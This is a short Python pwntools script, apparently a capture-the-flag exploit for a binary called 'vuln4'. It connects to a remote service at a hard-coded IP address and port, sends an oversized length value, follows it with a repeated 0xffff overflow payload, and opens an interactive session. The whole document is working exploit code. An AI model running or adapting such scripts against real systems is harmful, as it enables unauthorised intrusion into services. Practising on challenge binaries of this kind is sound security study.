#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln4', checksec = False)

# p = process(exe.path)
p = remote('45.33.118.86', 9994)

input()
p.sendlineafter(b'input? ', b'65636')
payload = p32(0xffff)*0x1c
p.sendlineafter(b'input: ', payload)


p.interactive()